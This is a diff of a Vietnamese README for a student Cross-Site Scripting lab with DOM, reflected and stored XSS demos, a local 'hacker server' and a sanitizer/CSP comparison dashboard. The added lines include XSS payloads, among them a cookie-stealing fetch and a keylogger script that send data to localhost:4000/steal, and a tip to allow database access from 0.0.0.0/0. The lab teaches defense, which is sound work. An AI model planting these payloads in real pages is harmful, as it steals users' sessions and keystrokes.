@@ -12,58 +12,85 @@ Bài tập thực hành **Cross-Site Scripting** — demo 3 loại tấn công v
 
 ## Cài đặt & Chạy
 
-### Yêu cầu
-- Node.js >= 18
-- Tài khoản MongoDB Atlas
-
-### Lần đầu
+**Yêu cầu:** Node.js >= 18, tài khoản MongoDB Atlas
 
 ```bash
-git clone <repo-url>
-cd cross-siteScripting
+git clone <repo-url> && cd cross-siteScripting
 
-# Copy file cấu hình
 cp backend/.env.example backend/.env
-# Sửa backend/.env — điền DATABASE_URL từ MongoDB Atlas
+# Mở backend/.env → điền DATABASE_URL từ MongoDB Atlas
 
-# Cài dependencies + generate Prisma
-npm run setup
+npm run setup   # cài deps + prisma generate (chạy 1 lần)
+npm run dev     # khởi động cả 3 server
 ```
 
-### Chạy
+> Lần đầu chạy backend cần thêm: `cd backend && npx prisma db push`
 
+**Chạy riêng từng service:**
 ```bash
-# Chạy cả 3 server cùng lúc
-npm run dev
+cd backend       && npm run dev   # :3000
+cd frontend      && npm run dev   # :5173
+cd hacker-server && npm run dev   # :4000
 ```
-
-Hoặc mở 3 terminal riêng:
-```bash
-cd backend       && npm run dev   # port 3000
-cd frontend      && npm run dev   # port 5173
-cd hacker-server && npm run dev   # port 4000
-```
-
-> **Lần đầu chạy backend:** cần thêm `npx prisma generate && npx prisma db push`
 
 ---
 
-## Phân công & Demo
+## Phân công
 
-Xem chi tiết từng người: **[TASKS.md](./TASKS.md)**  
-Hướng dẫn test: **[RUN-AND-TEST.md](./RUN-AND-TEST.md)**
+Chi tiết demo từng người xem **[TASKS.md](./TASKS.md)**
 
 | Người | Demo | URL |
 |---|---|---|
-| Person 1 | DOM XSS | `/xss-demo` |
-| Person 2 | Reflected XSS + Auth | `/demo/reflected-xss?msg=` |
-| Person 3 | Stored XSS + Security Dashboard | `/posts`, `/security` |
+| Person 1 | DOM XSS | `localhost:5173/xss-demo` |
+| Person 2 | Reflected XSS | `localhost:3000/demo/reflected-xss?msg=` |
+| Person 3 | Stored XSS + Security Dashboard | `localhost:5173/posts`, `/security` |
 | Person 4 | Hacker Server real-time | `localhost:4000` |
+
+---
+
+## Test nhanh
+
+### DOM XSS — `/xss-demo`
+Nhập vào ô input: `<img src=x onerror="alert('XSS')">`
+
+### Reflected XSS
+```
+http://localhost:3000/demo/reflected-xss?msg=<script>alert('XSS')</script>
+http://localhost:3000/demo/reflected-xss-fixed?msg=<script>alert('XSS')</script>
+```
+
+### Stored XSS — `/posts/new`
+Đăng nhập → tạo bài → chọn **Vulnerable Mode** → dùng Payload Library → đăng bài → mở bài → XSS thực thi.  
+Toggle sang **Secure Mode** → DOMPurify chặn.
+
+Payload hay dùng:
+```html
+<img src=x onerror="alert('Stored XSS')">
+<img src=x onerror="fetch('http://localhost:4000/steal?cookie='+document.cookie)">
+<script>document.onkeypress=function(e){fetch('http://localhost:4000/steal?type=key&key='+e.key)}</script>
+```
+
+### Hacker Server — `localhost:4000`
+Tạo post keylogger → mở bài → gõ phím → xem real-time trên Dashboard.
+
+### Security Dashboard — `/security`
+Chọn payload → so sánh 5 phương pháp sanitize. Toggle CSP ON → browser chặn inline script.
+
+---
+
+## Troubleshooting
+
+| Lỗi | Giải pháp |
+|---|---|
+| Backend không start | `npx prisma generate && npx prisma db push` |
+| `document.cookie` trống | Đúng — cookie là `httpOnly`. Dùng keylogger thay thế |
+| Hacker Dashboard trống | Kiểm tra port 4000 đang chạy |
+| MongoDB connection fail | Atlas → Network Access → Allow from anywhere (`0.0.0.0/0`) |
+| CORS error | Backend cho phép `localhost:5173` — kiểm tra URL |
 
 ---
 
 ## Lưu ý
 
-- Cookie được set `httpOnly: true` → `document.cookie` luôn **trống**. Dùng payload **Keylogger** hoặc **Phishing Overlay** để demo data theft.
-- MongoDB Atlas cần whitelist IP: Atlas → Network Access → Allow from anywhere.
+- Cookie `httpOnly: true` → `document.cookie` luôn trống. Dùng **Keylogger** hoặc **Phishing Overlay** để demo.
 - File `.env` không được commit — xem `backend/.env.example`.
